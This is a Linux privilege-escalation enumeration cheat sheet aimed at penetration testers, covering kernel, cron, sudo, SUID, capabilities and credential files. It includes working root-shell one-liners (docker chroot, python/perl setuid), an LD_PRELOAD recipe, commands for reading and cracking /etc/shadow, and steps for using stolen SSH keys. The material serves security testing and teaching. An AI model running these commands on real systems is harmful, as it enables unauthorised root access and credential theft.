## OS Enumeration

### Kernel & Architecture

```bash
uname -a          # full kernel string ‚Äî version, hostname, arch, date
uname -r          # kernel release only ‚Äî clean string for searchsploit
uname -m          # CPU architecture: x86_64 / aarch64 / i686
```

**What to extract from `uname -a` output:**
- **Kernel version** ‚Äî run through [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) and cross-check on [Exploit-DB](https://www.exploit-db.com/)
- **Architecture** ‚Äî determines which precompiled exploit binaries will execute

<Callout type="warning">
**Architecture mismatch kills payloads silently.** A `x86_64` exploit will not run on `aarch64`. Always confirm `uname -m` before uploading any compiled binary.
</Callout>

### Kernel Compile Info

```bash
cat /proc/version
```

Example output:
```
Linux version 6.8.0-41-generic (buildd@lcy02-amd64-077) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.2.0-23ubuntu4) 13.2.0 ...)
```

- `6.8.0-41-generic` ‚Üí **kernel version**
- `x86_64-linux-gnu-gcc-13` ‚Üí **compiler** ‚Äî match this version when compiling exploits locally to avoid ABI mismatches
- `buildd@lcy02-amd64-077` ‚Üí build machine (useful for fingerprinting cloud images)

### OS Release

```bash
cat /etc/issue
cat /etc/os-release
cat /etc/*-release
```

### Storage & Filesystems

```bash
lsblk                    # all block devices + current mount points
cat /etc/fstab           # all filesystems ‚Äî including unmounted ones
df -h                    # mounted filesystems with usage
```

<Callout type="info">
**`/etc/fstab`**
- **Unmounted partitions** ‚Äî potentially weaker permissions or cached sensitive data
- **NFS mounts with `no_root_squash`** ‚Äî local root on the attacker machine becomes root on the NFS share
- **CIFS/SMB mounts with inline credentials** ‚Äî `username=` and `password=` options are plaintext in the file
</Callout>

### Running Processes

```bash
ps aux        # all users + user column + non-tty processes
ps axjf       # all processes in forest/tree view
```

**`ps aux` columns to focus on:**
- **USER** ‚Äî processes running as `root` that reference writable scripts are your target
- **COMMAND** ‚Äî look for web servers, database processes, custom application scripts

<Callout type="info">
Tree view (`ps axjf`) exposes **parent-child relationships** ‚Äî spot scripts spawned by root daemons that might be replaceable or injectable.
</Callout>

### Scheduled Tasks

<Tabs>
  <Tab label="cron">

```bash
cat /etc/crontab
cat /etc/cron.d/*
ls -la /var/spool/cron/crontabs/
crontab -l                             # current user's crontab
```

**crontab field reference:**

```
MIN   HOUR   DOM   MON   DOW   USER    COMMAND
 30     2     *     *     1    root    /home/ubuntu/clear-mail.sh
*/5     *     *     *     *    root    /root/backup.sh
```

- **Field order:** `minute hour day-of-month month day-of-week user command`
- `30 2 * * 1` ‚Üí 02:30 every Monday as `root`
- `*/5 * * * *` ‚Üí every 5 minutes as `root`
- **Sixth field is your target** ‚Äî `root` means any script it calls runs with full privileges

</Tab>
<Tab label="systemd timers">

```bash
systemctl list-timers --all
```

```
NEXT                           LAST                           ACTIVATES
Mon 2025-01-13 06:23:10 UTC    Sun 2025-01-12 06:17:43 UTC    apt-daily.timer -> apt-daily.service
Mon 2025-01-13 00:00:00 UTC    Sun 2025-01-12 00:00:12 UTC    fstrim.timer -> fstrim.service
```

- **ACTIVATES** ‚Äî the unit/service triggered; inspect its `ExecStart` path for writable scripts
- **NEXT** ‚Äî tells you how long until it fires

```bash
systemctl cat apt-daily.service     # view the full unit file and ExecStart path
```

  </Tab>
</Tabs>

<Callout type="danger">
**Cron/timer privesc trigger:** If a root-owned scheduled task calls a script at a world-writable path (`/tmp/`, `/home/user/script.sh`), overwrite that script with a payload. **Check permissions on every path referenced** in crontab entries and timer unit files ‚Äî not just the script itself, but every directory in the path.
</Callout>

### Installed Packages

```bash
dpkg -l                                                         # Debian/Ubuntu ‚Äî all installed packages
dpkg -l | grep -i "apache\|nginx\|mysql\|python\|sudo\|snap"   # filter to interesting services
rpm -qa                                                         # Red Hat / CentOS equivalent
```

Cross-reference discovered versions with `searchsploit <package> <version>` or [exploit-db.com](https://www.exploit-db.com/).

## User Enumeration

### Current User Context

```bash
id                    # UID, GID, all supplementary groups
id [username]         # same for another user on the system
whoami                # username only
```

Example output:
```
uid=1001(asbawy) gid=1001(asbawy) groups=1001(asbawy),100(users)
uid=1002(matt) gid=1002(matt) groups=1002(matt),27(sudo),116(admin)
```

**High-value group memberships ‚Äî flag and act on immediately:**

| Group | Escalation Vector |
|---|---|
| `sudo` / `wheel` | Check `sudo -l` immediately |
| `docker` | `docker run -v /:/mnt -it alpine chroot /mnt sh` |
| `disk` | Raw block device read via `debugfs /dev/sda1` |
| `lxd` / `lxc` | Container image import ‚Üí host root escape |
| `adm` | Read `/var/log/auth.log` ‚Äî credentials in logs |
| `shadow` | Read `/etc/shadow` password hashes |

### Environment Variables

```bash
env
printenv
```

**Hunt for:**
- **`PATH`** ‚Äî writable directory earlier in PATH ‚Üí hijack a binary called by root
- **`LD_PRELOAD` / `LD_LIBRARY_PATH`** ‚Äî if preserved across `sudo` ‚Üí shared library injection
- **Credential patterns** ‚Äî `*_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `DATABASE_URL`, `AWS_*`

<Callout type="danger">
If `sudo -l` output shows `env_keep+=LD_PRELOAD`, you have a **trivial root escalation**. Compile a malicious `.so` that calls `setuid(0)` + `execvp("/bin/bash")` in its constructor, then run any `sudo`-allowed command with it set.
</Callout>

### Command History

```bash
history
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.python_history      # credentials entered in interactive Python sessions
cat ~/.mysql_history       # database credentials
cat ~/.nano_history        # recently edited files ‚Äî reveals sensitive paths
```

### Sudo Permissions

```bash
sudo -l
```

Example output:
```
Matching Defaults entries for asbawy on linux-enumeration:
    env_reset, mail_badpass, secure_path=...

User asbawy may run the following commands on linux-enumeration:
    (ALL) NOPASSWD: /usr/bin/nmap
```

<Callout type="danger">
**Every `NOPASSWD` entry is a potential root shell.** Cross-reference every allowed binary at [GTFOBins](https://gtfobins.github.io/) ‚Üí filter by `sudo`. Common vectors that always have entries: `nmap`, `vim`, `find`, `python`, `perl`, `ruby`, `awk`, `less`, `more`, `tee`, `cp`, `tar`, `bash`, `curl`, `wget`, `env`.
</Callout>

### /etc/passwd

```bash
cat /etc/passwd

# Real interactive users only:
cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /home

# Usernames only (fast overview):
cut -d ":" -f 1 /etc/passwd
```

**Field format:** `username : password : UID : GID : comment : home_dir : shell`

- **UID `0`** ‚Äî root-equivalent regardless of username; flag immediately
- **`x` in password field** ‚Äî hash stored in `/etc/shadow`
- **Hash directly in the passwd field** (legacy systems) ‚Äî `/etc/passwd` is world-readable, crack it

### /etc/shadow

```bash
ls -la /etc/shadow       # check permissions ‚Äî should be 640 root:shadow
cat /etc/shadow          # attempt read ‚Äî succeeds if misconfigured or your user is in 'shadow' group
```

<Callout type="danger">
If `/etc/shadow` is readable, extract all hashes and crack offline. Hash format identification:

| Prefix | Algorithm | Hashcat Mode |
|---|---|---|
| `$6$` | SHA-512crypt | `-m 1800` |
| `$5$` | SHA-256crypt | `-m 7400` |
| `$2y$` / `$2b$` | bcrypt | `-m 3200` |
| `$1$` | MD5crypt | `-m 500` |

```bash
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt
```
</Callout>

### SSH Keys

```bash
find / -name id_rsa 2>/dev/null
find / -name id_ed25519 2>/dev/null
find / -name id_ecdsa 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.key" 2>/dev/null
```

<Callout type="warning">
**Check permissions on every hit.** A private key owned by `root` but with loose permissions (`644` or `640`) is a direct path:

```bash
chmod 600 /tmp/id_rsa_stolen
ssh -i /tmp/id_rsa_stolen root@127.0.0.1
```

If the key is passphrase-protected, crack it:

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
# hashcat equivalent: hashcat -m 22921
```
</Callout>

### User Capabilities

```bash
cat /proc/$$/status | grep -i cap     # current shell capabilities (raw bitmask)
capsh --print                          # human-readable breakdown (requires capsh binary)
```

## Network Enumeration

### Interfaces & Routes

```bash
ip addr              # all interfaces and assigned IPs
ip route             # routing table ‚Äî reveals additional subnets to pivot into
ip neigh             # ARP cache ‚Äî live hosts on the local network
ifconfig             # legacy equivalent (net-tools package)
```

<Callout type="info">
**Interface signatures:**
- `docker0` ‚Üí Docker running locally; potential container escape or Docker socket abuse
- `tun0` / `wg0` ‚Üí VPN active
- `virbr0` ‚Üí KVM/libvirt hypervisor
- **Multiple non-loopback interfaces** ‚Üí active pivot point; map all subnets with `ip route`
</Callout>

### Active Connections & Listening Ports

<Tabs>
  <Tab label="ss (modern)">

```bash
ss -tpln      # TCP listening, with PID and process name
ss -tupln     # TCP + UDP listening
ss -anp       # all sockets, numeric, with process names
```

  </Tab>
  <Tab label="netstat (legacy)">

```bash
netstat -lt       # TCP listening ports only
netstat -ano      # all sockets, numeric, with timers
netstat -tpln     # TCP listening + PID/process name (PID visible only as root)
netstat -i        # interface statistics ‚Äî RX/TX counters, errors, drops
```

  </Tab>
</Tabs>

<Callout type="info">
Services bound to `127.0.0.1` are invisible externally but fully accessible on the box. **Internal-only ports are high-value targets** ‚Äî databases, admin panels, internal APIs, CI/CD agents. Reach them via local port forwarding from your attack box:

```bash
ssh -L 8080:127.0.0.1:8080 user@target   # forward target's local port 8080 to attacker:8080
```
</Callout>

## File System Enumeration

### SUID / SGID Binaries

```bash
# SUID ‚Äî binary executes as its owner (usually root)
find / -perm -u=s -type f 2>/dev/null

# SGID ‚Äî binary executes as its group owner
find / -perm -g=s -type f 2>/dev/null

# Both flags in one pass
find / -type f \( -perm -u=s -o -perm -g=s \) 2>/dev/null
```

<Callout type="danger">
**Every result is a potential root shell.** Feed each binary directly to [GTFOBins](https://gtfobins.github.io/) and filter by `suid`. Non-standard or custom SUID binaries not listed in GTFOBins warrant manual reverse engineering with `ltrace`, `strace`, or `ghidra`.
</Callout>

### Writable Directories & Files

```bash
# World-writable directories
find / -type d -perm -0002 2>/dev/null

# World-writable files (excluding noisy /proc)
find / -perm -0002 -type f 2>/dev/null | grep -v proc

# Root-owned files your current user can write to
find / -user root -writable -type f 2>/dev/null | grep -v proc
```

<Callout type="warning">
Writable files **outside** `/tmp` and your own home directory are anomalies. Scripts called by root-owned cron jobs or systemd services at writable paths are direct escalation paths. Overwrite them with a payload before the next trigger fires.
</Callout>

### Sensitive File Discovery

```bash
# Application config files
find / -name "*.conf" -type f 2>/dev/null
find / -name "*.config" -type f 2>/dev/null
find / -name ".env" -type f 2>/dev/null
find / -name "wp-config.php" -type f 2>/dev/null
find / -name "database.yml" -type f 2>/dev/null

# Password-adjacent filenames
find / -name "pass*" -type f 2>/dev/null
find / -name "*secret*" -type f 2>/dev/null
find / -name "*.bak" -type f 2>/dev/null

# Recently modified files (last 5 days) ‚Äî catches post-deployment changes
find / -mtime -5 -type f 2>/dev/null | grep -v proc | grep -v sys
```

### Dev Tools & Scripting Languages

```bash
which python python3 perl ruby php node gcc g++ make 2>/dev/null
find / -name "python*" -type f 2>/dev/null
find / -name "perl*" -type f 2>/dev/null
find / -name "gcc*" -type f 2>/dev/null
```

<Callout type="info">
Available interpreters determine your payload options **without transferring extra binaries**. `python3` + `gcc` on target = compile and execute arbitrary C on the box. `perl` + `python` = multiple GTFOBins shell escape routes available.
</Callout>

### Linux Capabilities

```bash
getcap -r / 2>/dev/null
```

Example output:
```
/usr/bin/python3.10 = cap_setuid+ep
/usr/bin/perl        = cap_setuid+ep
/usr/bin/tar         = cap_dac_read_search+ep
```

<Callout type="danger">
**Capabilities are the most overlooked privesc vector.** They grant individual kernel privileges to binaries **without the SUID bit** ‚Äî completely invisible to basic `ls -la` audits and missed by many automated tools.

| Capability | Impact |
|---|---|
| `cap_setuid` | `setuid(0)` ‚Üí instant root shell |
| `cap_setgid` | `setgid(0)` ‚Üí root group escalation |
| `cap_dac_read_search` | Bypass all file read permissions ‚Üí dump `/etc/shadow`, read any file |
| `cap_sys_admin` | Near-omnipotent: mount, ptrace, namespace ops, `CAP_SYS_ADMIN` exploits |
| `cap_net_raw` | Capture raw network traffic |
| `cap_net_bind_service` | Bind to privileged ports < 1024 |

The `+ep` suffix = **Effective + Permitted** ‚Äî capability is active on execution. Cross-reference all hits at [GTFOBins ‚Üí Capabilities](https://gtfobins.github.io/#capabilities).
</Callout>

```bash
# /usr/bin/python3 has cap_setuid+ep:
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```bash
# /usr/bin/perl has cap_setuid+ep:
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

```bash
# /usr/bin/tar has cap_dac_read_search+ep ‚Äî read any file on the system:
/usr/bin/tar -cvf /tmp/shadow.tar /etc/shadow && tar -xvf /tmp/shadow.tar
```
